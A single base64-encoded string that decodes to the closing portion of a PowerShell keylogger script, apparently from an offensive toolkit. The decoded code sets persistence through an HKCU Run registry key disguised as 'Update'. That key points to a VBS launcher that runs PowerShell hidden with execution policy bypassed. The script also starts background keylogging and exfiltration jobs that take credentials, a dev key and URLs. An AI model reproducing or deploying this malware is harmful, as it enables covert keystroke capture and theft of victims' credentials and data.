CAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKCiAgICAkbW9kdWxlbmFtZSA9ICRzY3JpcHQ6TXlJbnZvY2F0aW9uLk15Q29tbWFuZC5OYW1lCiAgICBpZigkcGVyc2lzdCAtZXEgJFRydWUpCiAgICB7CiAgICAgICAgJG5hbWUgPSAicGVyc2lzdC52YnMiIAogICAgICAgICRvcHRpb25zID0gInN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgYCRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlwYXN0ZSAkYXJnc1swXSAkYXJnc1sxXSAkYXJnc1syXSAkYXJnc1szXSAkYXJnc1s0XSAkYXJnc1s1XSAkYXJnc1s2XSAkYXJnc1s3XX0gLUFyZ3VtZW50TGlzdCBAKCRFeGZpbE9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRVUkwsJEF1dGhOUywkTWFnaWNTdHJpbmcsJENoZWNrVVJMKSIKICAgICAgICAkb3B0aW9uczIgPSAic3RhcnQtam9iIC1Jbml0aWFsaXphdGlvblNjcmlwdCBgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleWxvZ2dlciAkYXJnc1swXSAkYXJnc1sxXX0gLUFyZ3VtZW50TGlzdCBAKCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpIgogICAgICAgICRmdW5jID0gJGZ1bmN0aW9ucy5Ub3N0cmluZygpCiAgICAgICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICckZnVuY3Rpb25zID0gIHsnIC1Gb3JjZSAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJGZ1bmMgLUFwcGVuZCAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJ30nIC1BcHBlbmQgLU5vQ2xvYmJlciAkZW52OlRFTVBcJG1vZHVsZW5hbWUKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJG9wdGlvbnMgLUFwcGVuZCAtTm9DbG9iYmVyICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkb3B0aW9uczIgLUFwcGVuZCAtTm9DbG9iYmVyICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgICAgIAogICAgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggSEtDVTpTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cIC1OYW1lIFVwZGF0ZSAtUHJvcGVydHlUeXBlIFN0cmluZyAtVmFsdWUgJGVudjpURU1QXCRuYW1lIC1mb3JjZQogICAgICAgIGVjaG8gIlNldCBvYmpTaGVsbCA9IENyZWF0ZU9iamVjdChgIldzY3JpcHQuc2hlbGxgIikiID4gJGVudjpURU1QXCRuYW1lCiAgICAgICAgZWNobyAib2JqU2hlbGwucnVuKGAicG93ZXJzaGVsbCAtbm9leGl0IC1XaW5kb3dTdHlsZSBIaWRkZW4gLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLWZpbGUgJGVudjp0ZW1wXCRtb2R1bGVuYW1lYCIpIiA+PiAkZW52OlRFTVBcJG5hbWUKCiAgICB9ICAKCiAgICBlbHNlCiAgICB7CiAgICAgICAgaWYgKCRleGZpbCAtZXEgJFRydWUpCiAgICAgICAgewogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlwYXN0ZSAkYXJnc1swXSAkYXJnc1sxXSAkYXJnc1syXSAkYXJnc1szXSAkYXJnc1s0XSAkYXJnc1s1XSAkYXJnc1s2XSAkYXJnc1s3XX0gLUFyZ3VtZW50TGlzdCBAKCRFeGZpbE9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRVUkwsJEF1dGhOUywkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlsb2dnZXIgJGFyZ3NbMF0gJGFyZ3NbMV19IC1Bcmd1bWVudExpc3QgQCgkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0ICRmdW5jdGlvbnMgLXNjcmlwdGJsb2NrIHtLZXlsb2dnZXIgJGFyZ3NbMF0gJGFyZ3NbMV19IC1Bcmd1bWVudExpc3QgQCgkTWFnaWNTdHJpbmcsJENoZWNrVVJMKQogICAgICAgIH0KICAgIH0K
